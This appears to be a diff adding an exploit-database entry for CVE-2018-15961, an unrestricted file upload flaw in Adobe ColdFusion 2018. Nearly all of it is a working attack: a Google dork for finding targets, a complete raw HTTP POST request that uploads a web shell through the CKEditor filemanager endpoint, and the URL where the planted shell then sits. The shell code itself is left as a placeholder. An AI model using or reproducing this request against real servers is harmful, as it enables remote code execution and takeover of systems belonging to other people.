@@ -1,0 +1,39 @@
+# Exploit Title: Unrestricted file upload in Adobe ColdFusion 2018
+# Google Dork: ext:cfm
+# Date: 10-12-2018
+# Exploit Author: Pete Freitag of Foundeo
+# Reversed: Vahagn vah_13 Vardanian
+# Vendor Homepage: adobe.com
+# Version: 2018
+# Tested on: Adobe ColdFusion 2018
+# CVE : CVE-2018-15961
+# Comment: September 28, 2018: Updates for ColdFusion 2018 and ColdFusion
+2016 have been elevated to Priority 1 due to a report that CVE-2018-15961
+is now being actively exploited.
+
+
+```
+POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm
+HTTP/1.1
+Host: coldfusion:port
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/62.0.3202.9 Safari/537.36
+Content-Type: multipart/form-data;
+boundary=---------------------------24464570528145
+Content-Length: 303
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="file"; filename="shell_file"
+Content-Type: image/jpeg
+
+%shell code here%
+-----------------------------24464570528145
+Content-Disposition: form-data; name="path"
+
+shell
+-----------------------------24464570528145--
+```
+
+a shell will be located here http://coldfusion:port/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/shell_file
